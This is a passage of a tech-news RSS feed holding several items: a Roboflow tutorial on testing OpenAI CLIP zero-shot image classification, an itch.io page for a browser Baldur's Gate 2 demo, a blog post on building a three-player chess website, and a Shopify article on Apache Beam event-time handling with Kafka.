32,768 sampled captions. Image credit: <a href="https://openai.com/blog/clip/">OpenAI</a></figcaption></figure><p>In traditional classifiers, the meaning of the labels is ignored (in fact, they're often simply discarded and replaced with integers internally). By contrast, CLIP creates an encoding of its classes and is pre-trained on over 400 million text to image pairs. This allows it to leverage transformer models' ability to extract semantic meaning from text to make image classifications out of the box without being fine-tuned on custom data.</p><p><strong>All you need to do is define a list of possible classes, or descriptions, and CLIP will make a prediction for which class a given image is most likely to fall into based on its prior knowledge. Think of it as asking the model "which of these captions best matches this image?"</strong></p><p>In this post, we will walk through a demonstration of how to test out CLIP's performance on your own images so you can get some hard numbers and an intuition for how well CLIP actually does on various use case. <strong>We found that CLIP does better than <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">our custom trained ResNet classification models</a> on a <a href="https://public.roboflow.com/classification/flowers_classification">flower classification</a> task. </strong>It also does surprisingly well over a range of more obscure and challenging tasks (including identifying mushroom species in pictures from our camera roll and <a href="https://public.roboflow.com/object-detection/oxford-pets/2">identifying breeds of dogs and cats</a>).</p><p>Resources in this tutorial:</p><ul><li><a href="https://public.roboflow.com/classification/flowers_classification">Public flower classification dataset</a></li><li><a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">CLIP benchmarking Colab notebook</a></li><li><a href="https://github.com/openai/CLIP">CLIP repo</a></li><li>Corresponding YouTube</li></ul><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/8o701AEoZ8I?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="assembling-your-dataset">Assembling Your Dataset</h2><p>To try out CLIP, you will need to bring a dataset of images that you want classified, partitioned into the classes that you would like to see. </p><p>If you do not already have a dataset, and would like to just try out the new technology, take a look at Roboflow's <a href="https://public.roboflow.com/">public computer vision datasets</a>.</p><p>In this post, we'll be benchmarking CLIP on the public <a href="https://public.roboflow.com/classification/flowers_classification">flower classification dataset</a>. If using your own data, <a href="https://docs.roboflow.com/adding-data/classification">uploading your data to Roboflow</a> is easy and free (up to 1000 images), and then you can follow the same flow in this blog.</p><figure><img src="https://blog.roboflow.com/content/images/2021/01/image-9.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/image-9.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/01/image-9.png 1000w, https://blog.roboflow.com/content/images/size/w1600/2021/01/image-9.png 1600w, https://blog.roboflow.com/content/images/2021/01/image-9.png 1690w" sizes="(min-width: 720px) 720px"><figcaption>The example flowers classification dataset used in this post</figcaption></figure><p>Once you've assembled your dataset, it on to the <a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">CLIP benchmarking Colab notebook</a>.</p><h2 id="installing-clip-dependencies">Installing CLIP Dependencies</h2><p>To try CLIP out on your own data, make a copy of the notebook in your drive and make sure that under Runtime, the GPU is selected (Google Colab will give you a free GPU for use). Then, we make a few installs along with cloning the CLIP Repo. </p><h2 id="downloading-your-dataset-into-colab">Downloading Your Dataset into Colab</h2><p>The next step is to download your classification dataset into Colab. </p><figure><img src="https://blog.roboflow.com/content/images/2021/01/image-8.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/image-8.png 600w, https://blog.roboflow.com/content/images/2021/01/image-8.png 858w" sizes="(min-width: 720px) 720px"><figcaption>Downloading classification data into the notebook</figcaption></figure><p>If you made a dataset in Roboflow, this is achieved by hitting <code>Generate</code>, then <code>Download</code> in the <code>OpenAI CLIP Classification</code> format. This will put all of your test images in a folder called <code>test</code> with separate subdirectories of images for each class in your dataset and give you a <code>_tokenization.txt</code> file that lets you experiment with "Prompt Engineering" which can drastically improve or degrade the model's performance.</p><p>We've also created a converter for object detection datasets which will create a textual description from the bounding boxes present. We had mixed results with these but they are certainly interesting to play with.</p><p>Additionally, we have made all of <a href="https://public.roboflow.com/">our open source datasets</a> available to download for free in the CLIP format.</p><h2 id="inferring-class-labels-with-clip">Inferring Class Labels with CLIP</h2><p>The final step is to pass your test images through a predictions step. </p><p>CLIP takes an image and a list of possible class captions as inputs. You can define the class captions as you see fit in the <code>_tokenization.txt</code> file. Be sure to make sure they stay in the same order as the alphabetically sorted <code>class_names</code> (defined by the folder structure).</p><p><a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">The notebook</a> contains code to iterate over each of the class folders in the test set and pass the relevant images through a prediction step. </p><h3 id="experimenting-with-ontologies-and-results">Experimenting with Ontologies and Results</h3><p>When you use CLIP for your classification task, it is useful to experiment with different class captions for your classification ontology, and remember that CLIP was trained to differentiate between image captions.</p><p>On the flowers dataset, we tried the following ontologies and saw these results:</p><ul><li><code>"daisy" vs "dandelion"]</code> &nbsp;--&gt; 46% accuracy (worse than guessing)</li><li><code>"daisy flower" vs "dandelion flower"</code> --&gt; 64% accuracy</li><li><code>"picture of a daisy flower" vs "picture of a dandelion flower"</code> --&gt; 97% accuracy</li></ul><p><strong>97% accuracy is higher than any <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">other classification model</a> that we have trained on this dataset. </strong></p><p>These results show the importance of providing the right class descriptions to CLIP and express the richness of the pretraining procedure, a feature that is altogether lost in traditional, binary classification. OpenAI calls this process "prompt engineering".</p><h2 id="flipping-the-script">Flipping the Script</h2><p>CLIP may have many additional use cases including ranking images against a target query string, or sorting images among their uniqueness.</p><p>In <a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">the notebook</a>, you'll see code defining two variables <code>image_features</code> and <code>text_features</code>. The cosine similarity between any pair of these features represents their semantic distance - and from our experience thus far, it is strikingly accurate. These are the early days... </p><h2 id="conclusion">Conclusion</h2><p>If you find that CLIP's performance is not as high as you would like, you may still want to consider <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">training a custom image classification model with supervision</a>.</p><p>For more on CLIP research, consider reading <a href="https://cdn.openai.com/papers/Learning_Transferable_Visual_Models_From_Natural_Language_Supervision.pdf">the paper</a> and checking out <a href="https://openai.com/blog/clip/">OpenAI's blog post</a>. And we'd love to hear if you discover anything interesting when playing around with the model! Be sure to <a href="https://twitter.com/roboflowai">drop us a line on twitter</a>.</p><p>As always, happy inferencing!</p></div>
                
              </div>
            </div></div>]]>
            </description>
            <link>https://blog.roboflow.com/how-to-use-openai-clip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687532</guid>
            <pubDate>Fri, 08 Jan 2021 17:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Baldur's Gate 2 reincarnated in the browser using WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25687261">thread link</a>) | @yuri91
<br/>
January 8, 2021 | https://browser-games.itch.io/baldursgate2 | <a href="https://web.archive.org/web/*/https://browser-games.itch.io/baldursgate2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="header"><p><img alt="Baldur's Gate 2 Demo (Web Edition)" src="https://img.itch.zone/aW1nLzMzOTMyMDYuanBn/original/ymT9Bf.jpg"></p></div><div id="view_html_game_page_53729"><div id="html_embed_widget_50649"><div data-height="800" data-width="1000"></div></div><div><div><div><p>Link to Discord community:&nbsp;<a href="https://discord.gg/zUSZ3T8" rel="nofollow noopener">https://discord.gg/zUSZ3T8</a></p></div><div><div><span>More information<svg height="6" width="12" role="img" aria-hidden="" viewBox="0 0 37 20" version="1.1"><path d="m2.0858 0c-1.1535 0-2.0858 0.86469-2.0858 1.9331 0 0.5139 0.21354 1.0183 0.38704 1.1881l18.113 16.879 18.112-16.879c0.174-0.1696 0.388-0.674 0.388-1.1879 0-1.0684-0.932-1.9331-2.086-1.9331-0.577 0-1.111 0.23008-1.49 0.57992l-14.924 13.894-14.925-13.893c-0.3777-0.34998-0.9134-0.581-1.4902-0.581z"></path></svg></span></div><div><div><table><tbody><tr><td>Updated</td><td><abbr title="08 January 2021 @ 18:16"><span></span> 3 days ago</abbr></td></tr><tr><td>Status</td><td><a href="https://itch.io/games/released">Released</a></td></tr><tr><td>Platforms</td><td><a href="https://itch.io/games/html5">HTML5</a></td></tr><tr><td>Author</td><td><a href="https://browser-games.itch.io/">browser games</a></td></tr><tr><td>Genre</td><td><a href="https://itch.io/games/genre-rpg">Role Playing</a></td></tr></tbody></table></div></div></div><div><h2 id="comments">Leave a comment</h2><p><a href="https://itch.io/login?return_to=https%3A%2F%2Fbrowser-games.itch.io%2Fbaldursgate2" data-register_action="comment">Log in with itch.io</a> to leave a comment.</p><div id="community_topic_posts_widget_93873"></div></div></div><div><p><a href="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/original/Eh%2FX49.jpg" target="_blank" data-image_lightbox="true"><img src="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/347x500/O3hTpf.jpg"></a></p></div></div></div><div id="view_game_footer"><a href="https://itch.io/"><svg height="17" width="20" role="img" aria-hidden="" viewBox="0 0 262.728 235.452" version="1.1"><path d="M31.99 1.365C21.287 7.72.2 31.945 0 38.298v10.516C0 62.144 12.46 73.86 23.773 73.86c13.584 0 24.902-11.258 24.903-24.62 0 13.362 10.93 24.62 24.515 24.62 13.586 0 24.165-11.258 24.165-24.62 0 13.362 11.622 24.62 25.207 24.62h.246c13.586 0 25.208-11.258 25.208-24.62 0 13.362 10.58 24.62 24.164 24.62 13.585 0 24.515-11.258 24.515-24.62 0 13.362 11.32 24.62 24.903 24.62 11.313 0 23.773-11.714 23.773-25.046V38.298c-.2-6.354-21.287-30.58-31.988-36.933C180.118.197 157.056-.005 122.685 0c-34.37.003-81.228.54-90.697 1.365zm65.194 66.217a28.025 28.025 0 0 1-4.78 6.155c-5.128 5.014-12.157 8.122-19.906 8.122a28.482 28.482 0 0 1-19.948-8.126c-1.858-1.82-3.27-3.766-4.563-6.032l-.006.004c-1.292 2.27-3.092 4.215-4.954 6.037a28.5 28.5 0 0 1-19.948 8.12c-.934 0-1.906-.258-2.692-.528-1.092 11.372-1.553 22.24-1.716 30.164l-.002.045c-.02 4.024-.04 7.333-.06 11.93.21 23.86-2.363 77.334 10.52 90.473 19.964 4.655 56.7 6.775 93.555 6.788h.006c36.854-.013 73.59-2.133 93.554-6.788 12.883-13.14 10.31-66.614 10.52-90.474-.022-4.596-.04-7.905-.06-11.93l-.003-.045c-.162-7.926-.623-18.793-1.715-30.165-.786.27-1.757.528-2.692.528a28.5 28.5 0 0 1-19.948-8.12c-1.862-1.822-3.662-3.766-4.955-6.037l-.006-.004c-1.294 2.266-2.705 4.213-4.563 6.032a28.48 28.48 0 0 1-19.947 8.125c-7.748 0-14.778-3.11-19.906-8.123a28.025 28.025 0 0 1-4.78-6.155 27.99 27.99 0 0 1-4.736 6.155 28.49 28.49 0 0 1-19.95 8.124c-.27 0-.54-.012-.81-.02h-.007c-.27.008-.54.02-.813.02a28.49 28.49 0 0 1-19.95-8.123 27.992 27.992 0 0 1-4.736-6.155zm-20.486 26.49l-.002.01h.015c8.113.017 15.32 0 24.25 9.746 7.028-.737 14.372-1.105 21.722-1.094h.006c7.35-.01 14.694.357 21.723 1.094 8.93-9.747 16.137-9.73 24.25-9.746h.014l-.002-.01c3.833 0 19.166 0 29.85 30.007L210 165.244c8.504 30.624-2.723 31.373-16.727 31.4-20.768-.773-32.267-15.855-32.267-30.935-11.496 1.884-24.907 2.826-38.318 2.827h-.006c-13.412 0-26.823-.943-38.318-2.827 0 15.08-11.5 30.162-32.267 30.935-14.004-.027-25.23-.775-16.726-31.4L46.85 124.08c10.684-30.007 26.017-30.007 29.85-30.007zm45.985 23.582v.006c-.02.02-21.863 20.08-25.79 27.215l14.304-.573v12.474c0 .584 5.74.346 11.486.08h.006c5.744.266 11.485.504 11.485-.08v-12.474l14.304.573c-3.928-7.135-25.79-27.215-25.79-27.215v-.006l-.003.002z"></path></svg></a><p><a href="https://itch.io/">itch.io</a><span>·</span><a href="https://browser-games.itch.io/">View all by browser games</a><span>·</span>Report<span>·</span>Embed<span>·</span></p><p>Updated <abbr title="08 January 2021 @ 18:16"> 3 days ago</abbr></p><div><p><a href="https://itch.io/games">Games</a> › <a href="https://itch.io/games/genre-rpg">Role Playing</a> › <a href="https://itch.io/games/free">Free</a></p></div></div></div></div></div>]]>
            </description>
            <link>https://browser-games.itch.io/baldursgate2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687261</guid>
            <pubDate>Fri, 08 Jan 2021 17:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a three-player chess website]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687228">thread link</a>) | @Smlep
<br/>
January 8, 2021 | https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html | <a href="https://web.archive.org/web/*/https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="context">Context</h2>

<p>Around the end of 2019, as we were going through our few last months of
engineering school, we ended up having a quite consequent amount of free
time due to the highly irregular organisation of courses throughout the year.</p>

<p>Daniel, a friend of mine from school who has
been a huge fan of chess for a while now told us one night about how he read 
about this chess variant with three players and how he thought it would be
interesting to build a game engine for it.</p>

<p>Since I had time to <del>waste</del> spend building something <del>funny</del> meaningful,
I was interested in getting involved in this project to make it grow and be
something more than only a game engine (which I thought nobody would use
anyway, since playing chess through command line on a single computer does not
seem that appealing).</p>

<p>That’s how, Daniel, Vincent (another friend from school with whom I had
worked on many side projects), and I decided that we were going to build a
website so that people could come and play chess with two of their
friends.</p>

<h2 id="what-is-three-player-chess">What is three-player chess?</h2>

<p>Some might wonder what really is 3-player chess, do the rules change
when introducing a third player, and if they do, how?</p>

<p>Even though 3-player chess seems like a simple and precise concept, there are many variations
with light differences and not one set of rules for 3-player chess. These different
variations come in variants with different names (Trichess, Chess for three, Three-Player
Chess, Yalta chess…) but not every mention of one variant describes the same rules and
there is a huge lack of norm here.</p>

<p>The variation of chess played on <a href="https://yalta-chess.com/">yalta-chess.com</a> can be
considered as a unique variant, but mostly inspired by <strong>Yalta Chess</strong> (not much suspense
here) from which we tried to follow the rules as much as possible, but once again, the rules
differed depending on the articles.</p>

<p>On our website, you’ll play on a 96-cell board (32 for each player, just like usual chess).</p>

<p><img src="https://smlep.github.io/assets/yalta-animation4.gif" alt="Yalta board"></p>

<p>The moves are the same as classic chess, but it can take some time to get used to the
moves around the center or the board when starting to play <strong>Yalta Chess</strong>. The only real difference
with 2-player chess is how winners and losers are handled.</p>

<p>The winner is the first player to checkmate another player, meaning that there are one
winner and two losers. This makes the game more interesting, rewarding aggressive strategies
since playing too defensive might end up in a loss where one of the other players checkmated
the third player.</p>

<h2 id="early-development">Early development</h2>

<p>Our initial goal was pretty simple and seemed easy to accomplish, the
tasks which needed to be done could have been summed up as:</p>

<ul>
  <li>Building a game engine, implementing every rule and move.</li>
  <li>Having a game page on which 3 players could play together with a decent user
experience.</li>
  <li>Having a basic matchmaking system, so that players could join games easily.</li>
</ul>

<p>It looked easy and fast, the game engine was the main challenge since the special
shape of the board made the classic 2-player chess implementation unsuitable for
our needs and we needed to come up with a smart way to handle the board. Once the
game engine was out of the way, the only remaining thing would be to build a simple
website with basic functionalities.</p>

<p>Two of us already had some web development knowledge which we acquired through previous
side-projects, I would not say that we were <strong>amazing</strong> (or good) web developers,
but we were at least decent. Well, for the backend at least, our UI/UX level was (and
still is, but those who saw the website already know that) pretty bad.</p>

<p>Since we weren’t looking for high performances in our game engine because a few
milliseconds were not going to impact the user experience, building the engine was
actually pretty fast. One of us focused on it, and after a few days we had a game engine
implementing the rules and about everything we needed except <em>promotions</em>, <em>castling</em>, and
<em>en passant</em> which came later.</p>

<p>Our implementation relied on the fact that instead of using one 8x8 board as in 2-player
chess, we considered the board as 3 distinct 4x8 sub-boards, each sub-board filled with a
different color on the example below: 
<img src="https://smlep.github.io/assets/yalta-subboards.png" alt="Yalta debug mode"></p>

<p>The website, on the other hand, was way more complicated than we anticipated, handling
concurrent plays with real-time information transfer between the players (without
refreshing after each move) and implementing a decent user experience was much more
challenging than we expected.</p>

<p>Our first playable version looked like this:</p>

<p><img src="https://smlep.github.io/assets/yalta-debug.gif" alt="Yalta debug mode"></p>

<p>With the three boards representing the three sides of the board as explained above.</p>

<p>This first version allowed us to check that our engine worked as intended, but
required us to refresh a page to see the other players’ moves and wasn’t very user friendly.</p>

<p>That’s when we really became aware that the website part of the project would require
an amount of work strongly higher than the game engine implementation.</p>

<h2 id="a-basic-project">A basic project</h2>

<p>The more we implemented new features on our website, the more features we thought about
which seemed to be required to have a decent user experience on the website. Some of these features
were not necessary but seemed like good ideas/interesting to implement so we implemented some of them
and the others were listed and put aside for later.</p>

<p>After a few weeks, we had a decent result for the play part of the website; three players could
play on the same page, moving by selecting a piece and moving it to its location and seeing the actions’
results in real-time.</p>

<p>Our first <em>matchmaking</em> system was fairly basic, there was a list of created games, and any player
could join any game, if the user was the third player to join a game, it would start, and if there were
3 players already in the game, the user would be considered as a spectator. On top of that, any user
could create a new game.</p>

<p>At this time we had already spent way more time on this project than we thought we were going to,
even though we had only implemented the features we thought were necessary to have a good time
playing the game. The website’s current state was enough to send the link to some friends and play
games with them if we wanted to, the global design of the website wasn’t nice, but playing stayed pretty intuitive.</p>

<p><img src="https://smlep.github.io/assets/yalta-landing-1.png" alt="Landing page"></p>

<h2 id="not-so-basic-anymore">Not so basic anymore</h2>

<p>When we started this project, we did not define the real scope of users who would use it,
the more we worked on it and the more features we started implementing, the more we started to
want to make it public so that everyone could come and play.</p>

<p>As we started having less free time due to school projects and then the real jobs we got
after graduating, we spent way less time developing this project the following months but we kept working
on it and added a lot of new sfeature. Some of those being necessary for a public release,
some that we felt were a really nice addition for users and some which might just be
really useless (Hello, in-game chat). Among these extra-features are:</p>

<ul>
  <li>A custom game system to play with friends with custom settings</li>
  <li>A public queue system to play with random unknown players</li>
  <li>A training mode to play against bots in different difficulties</li>
  <li>A profile system with ranks, elo, skins, themes, and statistics</li>
  <li>Game timers</li>
  <li>A board rotation system, to see the board as one of your opponents</li>
  <li>An in-game chat</li>
  <li>The possibility to show replays of games</li>
  <li>A documentation section to explain the website and the game rules</li>
  <li>A landing page to explain to new users what happens here</li>
  <li>A new implementation of the game engine with improved performances
and a graph system (replacing the 3x4x8 sub-boards implementation)</li>
</ul>

<p>And of course, a landing page to welcome new players to our website.
The old matchmaking system based on a game list was removed, since the public
queue and private game system fully replaced the need for it.</p>

<p><img src="https://smlep.github.io/assets/yalta-ways-to-play.png" alt="Ways to play"></p>

<h2 id="costs-and-revenues">Costs and revenues</h2>

<p>As we added new features and new services which started to increase potential costs, we had to
consider the <em>business</em> aspect of the website. We were not fully against trying to monetize it but
we did not want this to impact the user experience, driving potential users away because of
<em>aggressive advertising</em> or <em>pay-to-win</em> systems.</p>

<p>We considered <strong>ads</strong>, but generic ads (such as adsense) would require to have a huge 
amount of traffic to really generate money and they usually don’t fit well into a website. We did
not want our website to get significantly less enjoyable for users just to win a few euros every month (or year).</p>

<!--
Another thing we considered was to bring premium content to the website, allowing users to purchase
differents assets such as skin. The issue with this solution is that it is really hard to find good
content which will not impact the other users impact experience.
We did implement a skin system, so that players could update the apparences of their pieces, so that
we could set up a system where the users would be able to buy these apparences. But the impact on the
other players which were just trying to focus would be too high, who wants to start a game and be
matched again a player with flashy purple pieces?
There are options to prevent this scenario such as adding a button to hide every opponents skin, but
players won't buy skins if the other players can't see it.
-->

<p>We considered some other solutions than ads but in the end, <strong>we did not find an adequate business model</strong>.
Not being able to generate revenue is not currently an issue, since the goal never was to quit our jobs and
start working on this project every day of the week. Nevertheless, we did not anticipate when we started this
project (before we decided to add many unexpected features) that there were gonna be real costs to run
the website.</p>

<p>Indeed, the website now runs using many different services and tools which come with a cost, meaning
that we cannot sustain with this business model (which is not one, since we generate no revenue) if
our user count grows too much.</p>

<p>As long as our monthly costs stay under a few dozen of euros, it is
fine, I’d say that we are happy to pay for it if some people are happy to play on
<a href="https://www.yalta-chess.com/">yalta-chess.com</a>. But if this website became too popular, we would have
to scale up the different services we pay for (hosting, Redis, database…), resulting in hundreds of
euros bills.</p>

<p>Hence, if too many people end up enjoying our website, at some point we will have to <strong>shut it
down</strong> (or strongly restrict traffic) if we still cannot generate revenue.</p>

<p>This is really <strong>unlikely</strong> to happen since we don’t plan on doing real advertising for this project,
and we are not so presumptuous as to think that this website is good enough to deserve this much 
success. But we still have to consider this scenario, and if it happens we will still try to consider
ways to generate revenue, we are not fully closed to ads, but we feel like right now nothing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</a></em></p>]]>
            </description>
            <link>https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687228</guid>
            <pubDate>Fri, 08 Jan 2021 17:34:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apache Beam for Search: Getting Started by Hacking Time]]>
            </title>
            <description>
<![CDATA[
Score 85 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25686936">thread link</a>) | @clandry94
<br/>
January 8, 2021 | https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time | <a href="https://web.archive.org/web/*/https://shopify.engineering/apache-beam-for-search-getting-started-by-hacking-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>To create relevant search, processing clickstream data is key: you frequently want to promote search results that are being clicked on and purchased, and demote those things users don’t love.</p>
<p>Typically search systems think of processing clickstream data as a batch job run over historical data, perhaps using a system like Spark. But on Shopify’s Discovery team, we ask the question: What if we could auto-tune relevance in real-time as users interact with search results—not having to wait days for a large batch job to run?</p>
<p>At Shopify—this is what we’re doing! We’re using streaming data processing systems that can process both real-time and historic data to enable real-time use cases ranging from simple auto boosting or down boosting of documents, to computing aggregate click popularity statistics, building <a href="https://elasticsearch-learning-to-rank.readthedocs.io/en/latest/core-concepts.html#judgments-expression-of-the-ideal-ordering" target="_blank" rel="nofollow noopener noreferrer">offline search evaluation sets</a>, and on to more complex reinforcement learning tasks.</p>
<p>But this article is introducing you to the streaming system themselves. In particular, to Apache Beam. And the most important thing to think about is <em>time</em> with those streaming systems. So let’s get started!</p>
<h2>What Exactly is Apache Beam?</h2>
<p><a href="https://beam.apache.org/" target="_blank" title="Apache Beam" rel="nofollow noopener noreferrer">Apache Beam</a> is a unified batch and stream processing system. This lets us potentially unify historic and real-time views of user search behaviors in one system. Instead of a batch system, like Spark, to churn over months of old data, and a separate streaming system, like Apache Storm, to process the live user traffic, Beam hopes to keep these workflows together.</p>
<p>For search, this is rather exciting. It means we can build search systems that both rely on historic search logs while perhaps being able to live-tune the system for our users’ needs in various ways.</p>
<p>Let’s walk through an early challenge everyone faces with Beam: that of <strong><em>time!</em></strong> Beam is a kind of time machine that has to reorder events in their right spot after getting annoyingly delayed by lots of intermediate processing and storage step. This is one of the core complications of a streaming system - how long do we wait? How do we deal with late or out of order data?</p>
<p>So to get started with Beam, the first thing you’ll need to do is Hack Time!</p>
<h2>The Beam Time Problem</h2>
<p>At the core of Apache Beam are <a href="https://beam.apache.org/documentation/programming-guide/#creating-a-pipeline" target="_blank" rel="nofollow noopener noreferrer">pipelines</a>. They connect a source through various processing steps to finally a sink.&nbsp;&nbsp;</p>
<p>Data flowing through a pipeline is timestamped. When you consider a streaming system, this makes sense. We have various delays as events flow from browsers, through APIs, and other data systems. Finally the events arrive at our Beam pipeline. They can easily be out-of-order or delayed. Beam source APIs, like the one for <a href="https://beam.apache.org/releases/javadoc/2.5.0/org/apache/beam/sdk/io/kafka/KafkaIO.html" target="_blank" rel="nofollow noopener noreferrer">Kafka</a>, maintain a moving view of the event data to emit well-ordered events known as a <a href="https://beam.apache.org/documentation/programming-guide/#watermarks-and-late-data" target="_blank" rel="nofollow noopener noreferrer">watermark</a>.</p>
<p>If we don’t give our Beam source good information on how to build a timestamp, we’ll drop events or receive them in the wrong order. But even more importantly for search, we likely must combine different streams of data to build a single view on a search session or query, like below:</p>
<figure><img alt="combine different streams of data to build a single view on a search session or query, like below" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Beam_for_Search__Getting_started_with_the_Beam_time_machine.png?format=jpg&amp;quality=90&amp;v=1610128718" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Beam_for_Search__Getting_started_with_the_Beam_time_machine.png?format=jpg&amp;quality=90&amp;v=1610128718"></figure>
<p>Joining (a Beam topic for another day!) needs to look back over each source’s watermark and ensure they’re aligned in time before deciding that sufficient time has elapsed before moving on. But before you get to the complexities of streaming joins, replaying with accurate timestamps is the first milestone on your Beam-for-clickstream journey.</p>
<h2>Configuring the Timestamp Right at the Source</h2>
<p>Let’s set up a simple Beam pipeline to explore Beam. Here we’ll use Kafka in Java as an example. You can see the full source code <a href="https://gist.github.com/geekigirl/738ead73033ae673483ab9690452f10f" target="_blank" title="Timestamp policy example with Kafka source with Apache BEAM" rel="nofollow noopener noreferrer">in this gist</a>.</p>
<p>Here we’ll set up a Kafka source, the start of a pipeline producing a custom SearchQueryEvent stored in a search_queries_topic.</p>

<p>You’ll notice we have information on the topic/servers to retrieve the data, along with how to deserialize the underlying binary data. We might add further processing steps to transform or process our SearchQueryEvents, eventually sending the final output to another system.</p>
<p>But nothing about <strong>time</strong> yet. By default, the produced SearchQueryEvents will use Kafka <em>processing</em> time. That is, when they’re read from Kafka. This is the least interesting for our purposes. We care about when users actually searched and clicked on results.</p>
<p>More interesting is when the event was created in a Kafka client. Which we can add here:</p>
<p><code>.withCreateTime(Duration.<em>standardMinutes</em>(5))</code></p>
<p>You’ll notice above, when we use create time below, we need to give the source’s Watermark a tip for how out of order event times might be. For example, below we instruct the Kafka source to use create time, but with a possible 5 minutes of discrepancy.&nbsp;</p>
<h2>Appreciating The Beam Time Machine</h2>
<p>Let’s reflect on what such a 5 minute possible delay actually means from the last snippet. Beam is kind of a time machine… How Beam bends space-time is where your mind can begin to hurt.</p>
<p>As you might be picking up, <em>event time </em>&nbsp;is quite different from <em>processing time</em>! So in the code snippet above, we’re *not* telling the computer to wait for 5 minutes of execution time for more data. No, the event time might be replayed from historical data, where 5 minutes of event time is replayed through our pipeline in mere milliseconds. Or it could be event time is really now, and we’re actively streaming live data for processing. So we DO indeed wait 5 real minutes!&nbsp;</p>
<p>Let’s take a step back and use a silly example to understand this. It’s really crucial to your Beam journey.&nbsp;</p>
<p>Imagine we’re super-robot androids that can watch a movie at 1000X speed. Maybe like Star Trek The Next Generation’s Lt Commander Data. If you’re unfamiliar, he could process input as fast as a screen could display! Data might say “Hey look, I want to watch the classic 80s movie, The Goonies, so I can be a cultural reference for the crew of the Enterprise.”&nbsp;</p>
<p>Beam is like watching a movie in super-fast forward mode with chunks of the video appearing possibly delayed or out of order relative to other chunks in movie time. In this context we have two senses of time:</p>
<ul>
<li>Event Time: the timestamp in the actual 1h 55 minute runtime of The Goonies aka movie time.</li>
<li>Processing Time: the time we actually experience The Goonies (perhaps just a few minutes if we’re super-robot androids like Data).</li>
</ul>
<p>So Data tells the Enterprise computer “Look, play me The Goonies as fast as you can recall it from your memory banks.” And the computer has various hiccups where certain frames of the movie aren’t quite getting to Data’s screen to keep the movie in order.&nbsp;</p>
<p>Commander Data can tolerate missing these frames. So Data says “Look, don’t wait more than 5 minutes in *movie time* (aka event time) before just showing me what you have so far of that part of the movie. This lets Data watch the full movie in a short amount of time, dropping a tolerable number of movie frames.</p>
<p>This is just what Beam is doing with our search query data. Sometimes it’s replaying days worth of historic search data in milliseconds, and other times we’re streaming live data where we truly must wait 5 minutes for reality to be processed. Of course, the right delay might not be 5 minutes, it might be something else appropriate to our needs.&nbsp;</p>
<p>Beam has other primitives such as <a href="https://beam.apache.org/releases/javadoc/2.0.0/org/apache/beam/sdk/transforms/windowing/Window.html" target="_blank" rel="nofollow noopener noreferrer">windows</a> which further inform, beyond the source, how data should be buffered or collected in units of time. Should we collect our search data in daily windows? Should we tolerate late data? What does subsequent processing expect to work over? Windows also work with the same time machine concepts that must be appreciated deeply to work with Beam.</p>
<h2>Incorporating A Timestamp Policy</h2>
<p>Beam might know a little about Kafka, but it really doesn’t know anything about <strong>our</strong> data model. Sometimes we need even more control over the definition of time in the Beam time machine.</p>
<p>For example, in our previous movie example, movie frames perhaps have some field informing us of how they should be arranged in movie time. If we examine our SearchQueryEvent, we also see a specific timestamp embedded in the data itself:</p>
<p><code>public class SearchQueryEvent {</code></p>
<p><code>&nbsp;&nbsp;&nbsp;public final String queryString;</code></p>
<p><code>&nbsp;&nbsp;&nbsp;public final Instant searchTimestamp;</code></p>
<p><code>…</code></p>
<p><code>}</code></p>
<p>Well Beam sources can often be configured to use a custom event time like our searchTimestamp. We just need to make a TimestampPolicy. We simply provide a simple function-class that takes in our record (A key-value of Long-&gt;SearchQueryEvent) and returns a timestamp:</p>

<p>We can use this to create our own timestamp policy:</p>

<p>Here, we’ve passed in our own function, and we’ve given the same allowed delay (5 minutes). This is all wrapped up in a factory class TimestampPolicyFactory SearchQueryTimestampPolicyFactory (now if that doesn’t sound like a Java class name, I don’t know what does ;) )</p>
